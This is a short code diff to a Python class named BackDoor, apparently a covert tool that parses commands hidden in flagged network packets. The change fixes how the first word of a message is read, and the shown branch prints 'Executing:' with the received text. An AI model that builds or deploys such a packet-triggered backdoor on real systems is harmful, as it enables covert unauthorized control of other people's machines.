@@ -427,7 +427,7 @@ class BackDoor:
 
     def process_packet(self, data):
         stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
-        if stripped_msg.strip()[0] == "search":
+        if stripped_msg.split()[0] == "search":
             print("search")
         else:
             print(f"Executing: {stripped_msg}")
